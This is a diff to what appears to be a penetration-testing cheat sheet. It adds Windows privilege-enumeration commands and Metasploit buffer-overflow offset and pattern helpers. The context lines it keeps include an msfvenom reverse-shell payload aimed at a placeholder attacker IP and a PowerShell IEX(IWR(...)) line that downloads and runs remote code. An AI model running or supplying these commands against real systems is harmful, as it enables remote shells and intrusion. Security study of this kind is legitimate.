@@ -677,6 +677,12 @@ taskkill /im:process_name_here
 
 # force kill process
 taskkill /im:process_name_here /f
+
+# display user information
+whoami /all
+
+# display user privileges
+whoami /priv
 ```
 
 
@@ -1348,6 +1354,34 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP LPORT=port_here -f e
 
 
 
+## MSF-NASM_SHELL
+```bash
+# locate jump to ESP
+msf-nsm_shell
+jmp esp
+```
+
+
+
+## MSF-PATTERN_CREATE
+```bash
+# create unique pattern
+msf-pattern_create -l length_here
+
+#  create unique pattern from specific set : ABC, def, 123
+msf-pattern_create -l length_here -s sets_here
+```
+
+
+
+## MSF-PATTERN_OFFSET
+```bash
+# locate EIP_bytes
+msf-pattern_offset -l length_here -q EIP_bytes_here
+```
+
+
+
 ## MSSQL
 ```sql
 # connect to a db server as user
@@ -1766,9 +1800,6 @@ Get-ChildItem C:\path\to\directory -Filter *.extension_here -Recurse | Select-S
 
 # search for a file
 Get-Childitem –Path C:\ -Recurse –force -ErrorAction SilentlyContinue -Include *.extension_here -File
-
-# display user privs
-whoami /all
 
 # download file from web server
 IEX(IWR('http://URL_here/file_here'))
